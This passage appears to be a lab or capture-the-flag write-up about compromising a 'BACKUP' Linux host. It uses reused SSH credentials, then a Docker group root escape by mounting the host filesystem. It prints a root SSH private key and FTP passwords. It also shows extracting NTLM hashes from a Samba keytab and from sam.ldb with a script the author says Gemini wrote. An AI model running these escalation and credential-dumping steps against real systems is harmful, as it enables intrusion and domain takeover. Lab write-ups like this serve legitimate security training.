And at last I can guess this will be the BACKUP machine:

```bash
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 pyftpdlib 1.5.7
| ftp-syst: 
|   STAT: 
| FTP server status:
|  Connected to: 10.13.38.58:21
|  Waiting for username.
|  TYPE: ASCII; STRUcture: File; MODE: Stream
|  Data connection closed.
|_End of status.
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 72:dd:96:5e:a9:77:be:ef:7c:54:4f:38:55:bf:69:c3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN5GJv3agTVOTvBSSviRDpZicfTbt8GBqUD2M5p6CM9OcpG5ieNJLUvSLX9Zt1YYE49eJqIMWlWh5nsHRbR926s=
|   256 f4:c3:6c:24:cf:eb:93:f4:14:3f:98:98:2d:fa:cb:93 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDwyZJVkoQfGVoBe7SKI1AtQ/ceWCC7jiPzNzoUFZ6j0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
TCP/IP fingerprint:
OS:SCAN(V=7.98%E=4%D=3/19%OT=21%CT=%CU=36436%PV=Y%DS=2%DC=T%G=N%TM=69BBD0F9
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST11
OS:NW7%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%R
OS:UD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 9.677 days (since Mon Mar  9 19:18:01 2026)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   32.79 ms 10.10.14.1

```

# SSH

With the Abbie credentials I am able to login via SSH to this server:

```bash
└─$ netexec ssh hosts.txt -u abbie@unintended.vl -p 'Hiu8sy8SA8h2'   
SSH         10.13.38.58     22     10.13.38.58      [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.13
SSH         10.13.38.57     22     10.13.38.57      [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.13
SSH         10.13.38.59     22     10.13.38.59      [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.13
SSH         10.13.38.58     22     10.13.38.58      [+] abbie@unintended.vl:Hiu8sy8SA8h2  Linux - Shell access!
SSH         10.13.38.57     22     10.13.38.57      [-] abbie@unintended.vl:Hiu8sy8SA8h2
SSH         10.13.38.59     22     10.13.38.59      [+] abbie@unintended.vl:Hiu8sy8SA8h2  Linux - Shell access!
Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00

```

And even if she is not between sudoers I can see she is part of Docker groups:

![4ed27caaf7d3dc99e9ec050933cb9cb5.png](../../../_resources/4ed27caaf7d3dc99e9ec050933cb9cb5.png)

And I can see one docker:

```bash
abbie@unintended.vl@backup:/$ docker ps
CONTAINER ID   IMAGE                COMMAND           CREATED       STATUS        PORTS     NAMES
3b4fb11f4672   python:3.11.2-slim   "sh ./setup.sh"   2 years ago   Up 11 hours             scripts_ftp_1
abbie@unintended.vl@backup:/$ 

```

And this is the FTP server:

```bash
abbie@unintended.vl@backup:/$ docker exec -it scripts_ftp_1 /bin/bash
root@ftp:/ftp# ls
server.py  setup.sh  volumes
root@ftp:/ftp# ls -al
total 20
drwxr-xr-x 3 root root 4096 Feb 24  2024 .
drwxr-xr-x 1 root root 4096 Feb 24  2024 ..
-rw-r--r-- 1 1000 1000  387 Feb 15  2024 server.py
-rw-r--r-- 1 1000 1000   60 Feb 15  2024 setup.sh
drwxr-xr-x 4 root root 4096 Jan 25  2024 volumes
root@ftp:/ftp# cat server.py 
from pyftpdlib.authorizers import DummyAuthorizer
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer

authorizer = DummyAuthorizer()

authorizer.add_user("ftp_admin", "u76n0wn287ak98f", "/ftp/volumes/", perm="elradfmw")

handler = FTPHandler
handler.authorizer = authorizer

server_local = FTPServer(("0.0.0.0", 21), handler)

server_local.serve_forever()
root@ftp:/ftp# cat setup.sh
#!/bin/bash
pip3 install pyftpdlib==1.5.7
python3 server.py
root@ftp:/ftp# 

```

And now I asked Gemini to get a Root via that escape on the container(i could also upload Alpine image but it is pointless at this moment):

```bash
abbie@unintended.vl@backup:/tmp/loot$ docker run -it -v /:/mnt python:3.11.2-slim /bin/bash
root@889310acb630:/# ls
bin  boot  dev	etc  home  lib	lib64  media  mnt  opt	proc  root  run  sbin  srv  sys  tmp  usr  var
root@889310acb630:/# chroot /mnt /bin/bash
root@889310acb630:/# cd  /mnt/
root@889310acb630:/mnt# ls
root@889310acb630:/mnt# lll
Command 'lll' not found, did you mean:
  command 'llt' from deb storebackup (3.2.1-2)
  command 'dll' from deb brickos (0.9.0.dfsg-12.2)
  command 'llc' from deb llvm (1:14.0-55~exp2)
  command 'lld' from deb lld (1:14.0-55~exp2)
  command 'lli' from deb llvm-runtime (1:14.0-55~exp2)
Try: apt install <deb name>
root@889310acb630:/mnt# ll
total 8
drwxr-xr-x  2 root root 4096 Aug 10  2023 ./
drwxr-xr-x 19 root root 4096 Jul 21  2025 ../
root@889310acb630:/mnt# cd /root
root@889310acb630:~# ls
flag.txt  scripts  snap
root@889310acb630:~# ll
total 44
drwx------  7 root root 4096 Jul 17  2025 ./
drwxr-xr-x 19 root root 4096 Jul 21  2025 ../
lrwxrwxrwx  1 root root    9 Jul 17  2025 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
drwx------  2 root root 4096 Feb 24  2024 .cache/
drwxr-xr-x  3 root root 4096 Feb 24  2024 .local/
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
drwx------  2 root root 4096 Feb 24  2024 .ssh/
-rw-r--r--  1 root root    0 Mar 30  2024 .sudo_as_admin_successful
-rw-r--r--  1 root root  165 Jul 17  2025 .wget-hsts
-rw-r--r--  1 root root   45 May 20  2025 flag.txt
drwxr-xr-x  3 svc  svc  4096 Feb 15  2024 scripts/
drwx------  3 root root 4096 Feb 24  2024 snap/
root@889310acb630:~# 


```

Now I chmounted the root from Docker to the Host and i can get the second flag:

```bash
root@889310acb630:~# cat flag.txt
UNINTENDED{a28eb03a8e55693ad461460de60f8704}
root@889310acb630:~# cat .ssh/
authorized_keys  id_rsa           id_rsa.pub       known_hosts      
root@889310acb630:~# cat .ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
root@889310acb630:~# 
```

And from the scripts folder I can see the credentials from the FTP server?

```bash
root@889310acb630:~/scripts/ftp# cat server.py 
from pyftpdlib.authorizers import DummyAuthorizer
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer

authorizer = DummyAuthorizer()

authorizer.add_user("ftp_admin", "u76n0wn287ak98f", "/ftp/volumes/", perm="elradfmw")

handler = FTPHandler
handler.authorizer = authorizer

server_local = FTPServer(("0.0.0.0", 21), handler)

server_local.serve_forever()
root@889310acb630:~/scripts/ftp# 

```

Now with these credentials I can download the FTP the backups!

![46749729e027ebd9215743dd233ee8bb.png](../../../_resources/46749729e027ebd9215743dd233ee8bb.png)

I suspect I need to extract the secrets from the Samba keytab:

![20ab59193afd44c1165298232d1379be.png](../../../_resources/20ab59193afd44c1165298232d1379be.png)

And i was able to export the DC machine hash from the DC.

```bash
└─$ python3 keytabextract.py /home/millycash/Downloads/Unintended/samba-backup-2024-02-17T20-32-13.580437/private/secrets.keytab 
[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
    REALM : UNINTENDED.VL
    SERVICE PRINCIPAL : HOST/dc
    NTLM HASH : 4d91de991a88e7e99e341aa4ba119fe3
    AES-256 HASH : 136a61e2c7ee97dbe0ccb5c22fde913af0aea4adda5b73f22fb31811ec79688b
    AES-128 HASH : 687cbda44f000346242239a9ebf9f2f2

```

Now these files are I am insterested into, specifically the password database which is the couterpart of NTDS.dit:

```bash
└─$ ll                                
total 4804
-rw-rw-r-- 1 millycash millycash       0 feb 17  2024 dns_update_cache
-rw-r--r-- 1 millycash millycash    3663 feb 17  2024 dns_update_list
-rw------- 1 millycash millycash      16 feb 17  2024 encrypted_secrets.key
-rw------- 1 millycash millycash   69632 feb 17  2024 hklm.ldb
-rw------- 1 millycash millycash   69632 feb 17  2024 idmap.ldb
-rw-r--r-- 1 millycash millycash     192 feb 17  2024 krb5.conf
-rw------- 1 millycash millycash    8192 feb 17  2024 passdb.tdb
-rw------- 1 millycash millycash   61440 feb 17  2024 privilege.ldb
-rw------- 1 millycash millycash 4526080 feb 17  2024 sam.ldb
drwxrwxr-x 2 millycash millycash    4096 mar 19 16:18 sam.ldb.d
-rw------- 1 millycash millycash     696 feb 17  2024 schannel_store.tdb
-rw------- 1 millycash millycash     689 feb 17  2024 secrets.keytab
-rw------- 1 millycash millycash   53248 feb 17  2024 secrets.ldb
-rw------- 1 millycash millycash   12288 feb 17  2024 secrets.tdb
-rw------- 1 millycash millycash   86016 feb 17  2024 share.ldb
-rw-r--r-- 1 millycash millycash     955 feb 17  2024 spn_update_list
drwxrwxr-x 2 millycash millycash    4096 mar 19 16:18 tls

```

Secretsdump doesn't work here so you have to use custom tools(like this [one](https://github.com/TovStalin/parse_samba_tdb.git)):

```bash
$ parse_samba_tdb -f ~/Downloads/Unintended/samba-backup-2024-02-17T20-32-13.580437/private/passdb.tdb
INFO:parse_samba_tdb:Trying to open file '/home/millycash/Downloads/Unintended/samba-backup-2024-02-17T20-32-13.580437/private/passdb.tdb'
WARNING:parse_samba_tdb:Thus file didn't contain a credentail

```

So here I asked Gemini to produce a script like this one:

```bash
└─$ cat samba_exporter.sh             
for user in $(ldbsearch -H sam.ldb "(sAMAccountName=*)" sAMAccountName | grep "sAMAccountName:" | awk '{print $2}'); do
    # Get the Base64 hash for this specific user
    hash_b64=$(ldbsearch -H sam.ldb "(sAMAccountName=$user)" unicodePwd | grep "unicodePwd::" | awk '{print $2}')
    
    if [ ! -z "$hash_b64" ]; then
        # Convert Base64 to Hex
        hash_hex=$(echo "$hash_b64" | base64 -d | xxd -p | tr -d '\n')
        echo -e "User: \033[1;32m$user\033[0m | Hash: $hash_hex"
    else
        echo "User: $user | Hash: <No Hash Found>"
    fi
done
       
```

And I have all the hashes now, ready for a pass the hash(everything is explained in this article https://samba.tranquil.it/doc/en/samba_fundamentals-about_password_hash.html):

```bash
─$ ./samba_exporter.sh 
User: DnsAdmins | Hash: <No Hash Found>
User: Incoming | Hash: <No Hash Found>
User: Performance | Hash: <No Hash Found>
User: Terminal | Hash: <No Hash Found>
User: Domain | Hash: <No Hash Found>
User: Remote | Hash: <No Hash Found>
User: Guest | Hash: <No Hash Found>
User: Domain | Hash: <No Hash Found>
User: Guests | Hash: <No Hash Found>
User: Event | Hash: <No Hash Found>
User: Replicator | Hash: <No Hash Found>
-e User: WEB$ | Hash: b7355a0f2886996d44a9bb0aa4dbf5fd
User: Domain | Hash: <No Hash Found>
User: Schema | Hash: <No Hash Found>
User: Pre-Windows | Hash: <No Hash Found>
User: Cryptographic | Hash: <No Hash Found>
User: Denied | Hash: <No Hash Found>
User: Domain | Hash: <No Hash Found>
User: Distributed | Hash: <No Hash Found>
User: Domain | Hash: <No Hash Found>
-e User: BACKUP$ | Hash: a966882123ef92515335cab77a01f39d
-e User: juan | Hash: afadfb9d37ef739ff9f60399077a6f4b
User: Backup | Hash: <No Hash Found>
User: Web | Hash: <No Hash Found>
User: Administrators | Hash: <No Hash Found>
User: Group | Hash: <No Hash Found>
-e User: DC$ | Hash: 4d91de991a88e7e99e341aa4ba119fe3
User: Windows | Hash: <No Hash Found>
User: IIS_IUSRS | Hash: <No Hash Found>
User: Certificate | Hash: <No Hash Found>
User: Enterprise | Hash: <No Hash Found>
User: Enterprise | Hash: <No Hash Found>
User: DnsUpdateProxy | Hash: <No Hash Found>
User: Print | Hash: <No Hash Found>
-e User: krbtgt | Hash: 82896bbb4d088e5aa624628adaf82826
User: RAS | Hash: <No Hash Found>
-e User: abbie | Hash: 1c009d742ad1c61bc8dfbfbe429de7e8
User: Allowed | Hash: <No Hash Found>
User: Network | Hash: <No Hash Found>
-e User: Administrator | Hash: 36fe241ea0eaa533d5fac8bd7fb6f8a3
User: Read-only | Hash: <No Hash Found>
User: Account | Hash: <No Hash Found>
User: Server | Hash: <No Hash Found>
User: Users | Hash: <No Hash Found>
User: Cert | Hash: <No Hash Found>
User: Performance | Hash: <No Hash Found>
-e User: cartor | Hash: 7daddb8282571a00eb649709ef894fa2

```

&nbsp;